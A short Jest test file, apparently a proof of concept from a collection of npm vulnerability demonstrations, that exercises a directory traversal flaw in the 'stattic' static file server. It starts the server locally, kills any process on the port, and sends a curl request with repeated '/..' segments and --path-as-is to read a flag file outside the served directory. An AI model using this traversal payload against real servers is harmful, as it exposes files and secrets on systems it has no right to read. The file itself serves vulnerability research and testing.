//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/stattic/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in stattic", (done) => {
  const stattic = require("stattic");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");

  try{
    a.execSync('fuser -k 8977/tcp',()=>{})//killing any other process using the same port
  }catch(e){}

  stattic.set("folder", "."); //Set the folder with the static files
  stattic.set("port", 8977); //Set the port
  stattic.listen(); //Run the server

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8977${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
